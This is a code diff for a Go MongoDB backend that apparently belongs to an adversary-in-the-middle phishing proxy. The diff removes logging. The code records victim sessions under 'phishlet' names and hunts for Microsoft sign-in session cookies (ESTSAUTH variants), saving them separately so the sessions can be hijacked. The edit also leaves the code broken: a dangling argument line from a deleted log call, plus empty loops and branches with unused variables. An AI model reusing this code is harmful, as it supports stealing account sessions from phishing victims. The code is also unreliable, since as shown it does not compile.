@@ -61,7 +61,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		SetDirect(false)
 	
 	// محاولة الاتصال
-	log.Debug("[MongoDB] بدء الاتصال...")
 	client, err := mongo.Connect(ctx, clientOptions)
 	if err != nil {
 		cancel()
@@ -69,7 +68,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 	}
 
 	// التحقق من الاتصال
-	log.Debug("[MongoDB] اختبار الاتصال...")
 	pingCtx, cancelPing := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancelPing()
 	
@@ -84,7 +82,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 	sessionsColl := db.Collection("sessions")
 	
 	// إنشاء فهرس على حقل SessionId للبحث السريع
-	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
 	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
 		Keys:    bson.D{{Key: "session_id", Value: 1}},
 		Options: options.Index().SetUnique(true),
@@ -94,7 +91,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		client.Disconnect(ctx)
 		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
 	}
-	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
 	
 	// عد عدد الجلسات الموجود
 	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
@@ -216,39 +212,31 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
 			return 0, nil
 		}
-		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
 		return 0, err
 	}
-	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
 	return session.Id, nil
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
 func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
-	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
 	
 	// التحقق مما إذا كانت الجلسة موجودة بالفعل
 	var existingSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
 	if err == nil {
-		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
 		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
 	} else if err != mongo.ErrNoDocuments {
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
 		return err
 	}
 
 	// الحصول على آخر معرف
 	lastId, err := m.GetLastSessionId()
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
 		return err
 	}
 	newId := lastId + 1
-	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)
 
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
@@ -272,28 +260,23 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
 		return err
 	}
 	
-	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
 	return nil
 }
 
 // ListSessions يجلب قائمة الجلسات من MongoDB
 func (m *MongoDatabase) ListSessions() ([]*Session, error) {
-	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
 	
 	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
 		return nil, err
 	}
 	defer cursor.Close(m.ctx)
 
 	var mongoSessions []MongoSession
 	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
-		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
 		return nil, err
 	}
 
@@ -321,20 +304,16 @@ func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
 
 // GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
 func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
-	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
 	
 	var mongoSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
 			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
 		}
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
 		return nil, err
 	}
 	
-	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
 	return convertFromMongoSession(&mongoSession), nil
 }
 
@@ -402,20 +381,16 @@ func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
 // UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
 func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	// طباعة معلومات تشخيصية
-	log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
 	
 	// تسجيل عدد المجالات والكوكيز
 	totalCookies := 0
 	for domain, domainTokens := range tokens {
 		totalCookies += len(domainTokens)
-		log.Debug("[MongoDB] المجال %s يحتوي على %d كوكيز", domain, len(domainTokens))
 		
 		// طباعة تفاصيل كل كوكي في المجال
 		for name, token := range domainTokens {
-			log.Debug("[MongoDB] - الكوكي: %s = %s", name, token.Value)
 		}
 	}
-	log.Debug("[MongoDB] إجمالي عدد المجالات: %d، إجمالي عدد الكوكيز: %d", len(tokens), totalCookies)
 	
 	// البحث عن الكوكيز المهمة
 	importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
@@ -424,7 +399,6 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 		for domain, domainTokens := range tokens {
 			for tokenName, token := range domainTokens {
 				if strings.EqualFold(tokenName, cookieName) {
-					log.Success("[MongoDB] وجدت كوكي مهم %s (اسم أصلي: %s) = %s في المجال %s", 
 						cookieName, tokenName, token.Value, domain)
 					found = true
 					break
@@ -435,7 +409,6 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 			}
 		}
 		if !found {
-			log.Warning("[MongoDB] لم يتم العثور على الكوكي المهم: %s في قائمة الكوكيز للحفظ", cookieName)
 		}
 	}
 	
@@ -444,10 +417,8 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Error("[MongoDB] الجلسة غير موجودة، لا يمكن تحديث الكوكيز: %s", sid)
 			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
 		}
-		log.Error("[MongoDB] خطأ أثناء استرداد الجلسة: %v", err)
 		return err
 	}
 	
@@ -491,14 +462,12 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 			
 			// استخدام الاسم الأصلي (مع الحفاظ على حالة الأحرف) للكوكيز المهمة
 			if isImportant {
-				log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
 				cookieTokens[domain][name] = cookieData
 				
 				// أيضاً، حفظه باسم مطابق 100% للقائمة المهمة للتأكد
 				for _, importantName := range importantCookies {
 					if strings.EqualFold(name, importantName) {
 						cookieTokens[domain][importantName] = cookieData
-						log.Success("[MongoDB] تحويل كوكي مهم باسمه الأصلي: %s = %s", importantName, token.Value)
 					}
 				}
 			} else {
@@ -517,29 +486,23 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 		},
 	}
 	
-	log.Debug("[MongoDB] محاولة تحديث الكوكيز بالتفاصيل الكاملة")
 	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
 	
 	if err != nil {
-		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
 		return err
 	}
 	
-	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
 	
 	// التحقق من الحفظ
 	var updatedSession MongoSession
 	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&updatedSession)
 	if err != nil {
-		log.Error("[MongoDB] فشل التحقق من الحفظ: %v", err)
 	} else {
 		// التحقق من وجود المجالات والكوكيز
 		if updatedSession.CookieTokens != nil {
-			log.Debug("[MongoDB] التحقق: تم استرداد %d مجال من الكوكيز بعد التحديث", len(updatedSession.CookieTokens))
 			
 			// طباعة محتويات الكوكيز المحفوظة
 			for domain, domainTokens := range updatedSession.CookieTokens {
-				log.Debug("[MongoDB] المجال المحفوظ: %s (عدد الكوكيز: %d)", domain, len(domainTokens))
 				
 				// البحث عن الكوكيز المهمة في البيانات المستردة
 				for tokenName, tokenValue := range domainTokens {
@@ -547,21 +510,17 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 					for _, importantName := range importantCookies {
 						if strings.EqualFold(tokenName, importantName) {
 							// طباعة قيمة الكوكي المهم
-							log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s في المجال %s", tokenName, domain)
 							// طباعة قيمة الكوكي إذا أمكن استخراجها
 							if tokenMap, ok := tokenValue.(map[string]interface{}); ok {
 								if value, hasValue := tokenMap["value"]; hasValue {
-									log.Success("[MongoDB] قيمة الكوكي المهم المحفوظ %s = %v", tokenName, value)
 								}
 							} else {
-								log.Debug("[MongoDB] نوع قيمة الكوكي: %T", tokenValue)
 							}
 						}
 					}
 				}
 			}
 		} else {
-			log.Error("[MongoDB] التحقق: CookieTokens فارغ بعد الحفظ!")
 		}
 	}
 	
@@ -583,9 +542,7 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 					
 					_, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, extraUpdate)
 					if err != nil {
-						log.Error("[MongoDB] فشل حفظ الكوكي المهم %s كحقل منفصل: %v", cookieName, err)
 					} else {
-						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, token.Value)
 					}
 					break
 				}
@@ -601,11 +558,9 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 
 // DeleteSessionById يحذف جلسة باستخدام المعرف العددي
 func (m *MongoDatabase) DeleteSessionById(id int) error {
-	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
 	
 	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
 		return err
 	}
 	
@@ -613,7 +568,6 @@ func (m *MongoDatabase) DeleteSessionById(id int) error {
 		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
 	}
 	
-	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
 	return nil
 }
 
